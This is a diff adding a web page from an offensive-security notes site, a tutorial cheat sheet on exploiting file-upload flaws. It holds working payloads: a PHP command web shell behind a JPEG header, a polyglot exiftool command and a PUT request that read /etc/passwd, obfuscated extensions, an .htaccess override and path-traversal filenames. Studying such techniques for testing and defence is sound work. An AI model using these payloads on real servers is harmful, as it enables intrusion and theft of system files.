@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="description" content="Understand how to exploit file upload functionalities through flawed validation, misconfigurations, race conditions, and other advanced techniques.">
+  <title>offsecnotes | File upload vulnerabilities</title>
+  <link rel="icon" type="image/png" href="/static/favicon.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github.min.css" media="(prefers-color-scheme: light)" data-theme-css="light">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/styles/github-dark.min.css" media="(prefers-color-scheme: dark)" data-theme-css="dark">
+  <link rel="stylesheet" href="/static/style.css">
+  <script>
+    // Theme: saved choice (light/dark) or, if none, the system preference.
+    // Runs before the page is drawn, so there's no flash of the wrong theme.
+    function setTheme(theme) {
+      document.documentElement.dataset.theme = theme;
+      document.querySelectorAll("link[data-theme-css]").forEach(function (link) {
+        link.media = link.dataset.themeCss === theme ? "all" : "not all";
+      });
+    }
+    function toggleTheme() {
+      var current = document.documentElement.dataset.theme ||
+        (matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light");
+      var next = current === "dark" ? "light" : "dark";
+      setTheme(next);
+      try { localStorage.setItem("theme", next); } catch (e) {}
+    }
+    try { var saved = localStorage.getItem("theme"); if (saved) setTheme(saved); } catch (e) {}
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.11.1/languages/go.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+  <header>
+    <div class="header-top">
+      <h1>offsecnotes</h1>
+      <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle light/dark theme" title="Toggle theme"></button>
+    </div>
+    <nav>
+      <a href="/">Home</a> • <a href="/Android/">Android</a> • <a href="/Web/">Web</a> •
+      <a href="/Network/">Network</a> • <a href="/Linux/">Linux</a> •
+      <a href="/Windows/">Windows</a> • <a href="/Misc/">Misc</a>
+    </nav>
+  </header>
+  <h1>File upload vulnerabilities</h1>
+  <span>by frankheat</span>
+  <div class="toc"><ul>
+<li><a href="#flawed-file-validation" id="toc-flawed-file-validation">Flawed File Validation</a>
+<ul>
+<li><a href="#content-type-bypass" id="toc-content-type-bypass">Content-Type Bypass</a></li>
+<li><a href="#dangerous-file-extensions" id="toc-dangerous-file-extensions">Dangerous File Extensions</a></li>
+<li><a href="#file-content-validation" id="toc-file-content-validation">File Content Validation</a></li>
+<li><a href="#polyglot-files" id="toc-polyglot-files">Polyglot Files</a></li>
+</ul></li>
+<li><a href="#overriding-server-configuration" id="toc-overriding-server-configuration">Overriding Server Configuration</a></li>
+<li><a href="#put-method-exploitation" id="toc-put-method-exploitation">PUT Method Exploitation</a></li>
+<li><a href="#path-traversal-file-upload" id="toc-path-traversal-file-upload">Path Traversal + File Upload</a></li>
+<li><a href="#upload-without-rce" id="toc-upload-without-rce">Upload Without RCE</a></li>
+<li><a href="#race-conditions-in-file-uploads" id="toc-race-conditions-in-file-uploads">Race Conditions in File Uploads</a>
+<ul>
+<li><a href="#exploiting-url-based-uploads" id="toc-exploiting-url-based-uploads">Exploiting URL-Based Uploads</a></li>
+</ul></li>
+</ul></div>
+  <hr>
+<p>Improper handling of file uploads is a common security weakness in web applications. If not carefully validated, uploaded files can lead to remote code execution (RCE), cross-site scripting (XSS), and other types of attacks.</p>
+<blockquote>
+<p><strong>Warning</strong>: By default, servers do not execute uploaded files unless they are explicitly configured to do so.</p>
+</blockquote>
+<hr />
+<h2 id="flawed-file-validation">Flawed File Validation</h2>
+<p>Poor validation allows attackers to bypass filters and upload dangerous files.</p>
+<h3 id="content-type-bypass">Content-Type Bypass</h3>
+<p>Change <code>Content-Type</code> to an allow MIME type. (e.g. <code>image/jpeg</code>)</p>
+<h3 id="dangerous-file-extensions">Dangerous File Extensions</h3>
+<p>Some file extensions are known to trigger execution on the server. Even if certain types are blacklisted, you can still try alternate or obfuscated extensions:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co"># Common dangerous extensions</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">.php</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">.php3</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">.php4</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">.php5</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">.phtml</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">.phar</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="co"># Obfuscation examples</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.pHp</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.php.jpg</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.php.</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit%2Ephp</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.asp</span><span class="kw">;</span><span class="ex">.jpg</span></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.asp%00.jpg</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">exploit.p.phphp</span></span></code></pre></div>
+<h3 id="file-content-validation">File Content Validation</h3>
+<p>Even if the extension is valid, some servers validate the file content using magic numbers (specific byte patterns at the start of files).</p>
+<table>
+<thead>
+<tr class="header">
+<th>File</th>
+<th>Hex Signature</th>
+<th>ISO 8859-1</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>PNG</td>
+<td>89 50 4E 47 0D 0A 1A 0A</td>
+<td>‰PNG␍␊␚␊</td>
+</tr>
+<tr class="even">
+<td>JPG/JPEG</td>
+<td>FF D8 FF EE</td>
+<td>ÿØÿî</td>
+</tr>
+<tr class="odd">
+<td>JPG/JPEG</td>
+<td>FF D8 FF E0</td>
+<td>ÿØÿà</td>
+</tr>
+<tr class="even">
+<td>JPG/JPEG</td>
+<td>FF D8 FF E0 00 10 4A 46 49 46 00 01</td>
+<td>ÿØÿà␀␐JFIF␀␁</td>
+</tr>
+<tr class="odd">
+<td>PDF</td>
+<td>25 50 44 46 2D</td>
+<td>%PDF-</td>
+</tr>
+</tbody>
+</table>
+<p>You can still inject malicious code using a valid header:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode php"><code class="sourceCode php"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>ÿØÿî</span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ot">?</span>php <span class="kw">echo</span> <span class="fu">system</span>(<span class="va">$_GET</span>[<span class="st">&#39;cmd&#39;</span>])<span class="ot">;</span> <span class="kw">?&gt;</span></span></code></pre></div>
+<h3 id="polyglot-files">Polyglot Files</h3>
+<p>Create a polyglot JPEG file containing malicious code within its metadata</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">exiftool</span> <span class="at">-Comment</span><span class="op">=</span><span class="st">&quot;&lt;?php echo &#39;START &#39; . file_get_contents(&#39;/etc/passwd&#39;) . &#39; END&#39;; ?&gt;&quot;</span> <span class="op">&lt;</span>YOUR-INPUT-IMAGE<span class="op">&gt;</span>.jpg <span class="at">-o</span> polyglot.php</span></code></pre></div>
+<p>This works if you can upload a php extension file. This works why you have a real image file (that bypass restrictions) but when you open the image it’s executed as php script.</p>
+<hr />
+<h2 id="overriding-server-configuration">Overriding Server Configuration</h2>
+<p>Many servers allow configuration files in directories to override global settings. Web servers use them when present, but they’re not accessible via HTTP requests.</p>
+<p>If the file extension is blacklisted, you might trick the server into mapping a custom file extension to an executable MIME type.</p>
+<ul>
+<li>Apache servers ➜ <code>.htaccess</code></li>
+<li>Example: <code>AddType application/x-httpd-php .&lt;EXTENSION&gt;</code></li>
+</ul>
+<hr />
+<h2 id="put-method-exploitation">PUT Method Exploitation</h2>
+<p>Some servers support the HTTP <code>PUT</code> method for uploading files directly.</p>
+<pre class="http"><code>PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+&lt;?php echo file_get_contents(&#39;/etc/passwd&#39;); ?&gt;</code></pre>
+<hr />
+<h2 id="path-traversal-file-upload">Path Traversal + File Upload</h2>
+<p>If execution is blocked in the upload directory but the web server use the filename field in the request to determine the file’s name and location, you can try to escape using path traversal in the <code>filename</code> field:</p>
+<pre class="http"><code>Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;../exploit.php&quot;</code></pre>
+<blockquote>
+<p><strong>Tip</strong>: If directory traversal is filtered, try encoding it: <code>filename="..%2fexploit.php"</code>.</p>
+</blockquote>
+<hr />
+<h2 id="upload-without-rce">Upload Without RCE</h2>
+<p>Even without remote code execution, you can still cause harm:</p>
+<ul>
+<li>Upload <code>.html</code> or <code>.svg</code> files with embedded JavaScript ➜ <strong>Stored XSS</strong></li>
+<li>Upload XML files like <code>.docx</code>, <code>.xlsx</code> ➜ Possible <strong>XXE injection</strong></li>
+</ul>
+<hr />
+<h2 id="race-conditions-in-file-uploads">Race Conditions in File Uploads</h2>
+<p>In some setups, files are uploaded and scanned (e.g., with antivirus) before being permanently stored. During this short window, the file may exist temporarily on disk and you could potentially execute it.</p>
+<ul>
+<li>Race conditions</li>
+<li>Difficult to detect</li>
+</ul>
+<h3 id="exploiting-url-based-uploads">Exploiting URL-Based Uploads</h3>
+<p>If a file is loaded into a temporary directory with a randomized name, it should be impossible for an attacker to exploit any race conditions.</p>
+<ul>
+<li>If the randomized directory name is generated using pseudo-random functions like PHP’s <code>uniqid()</code>, it can potentially be brute-forced.
+<ul>
+<li>Try to extend the amount of time taken to process the file by uploading a larger file</li>
+</ul></li>
+<li>If it is processed in chunks, you can potentially take advantage of this by creating a malicious file with the payload at the start, followed by a large number of arbitrary padding bytes.</li>
+</ul>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
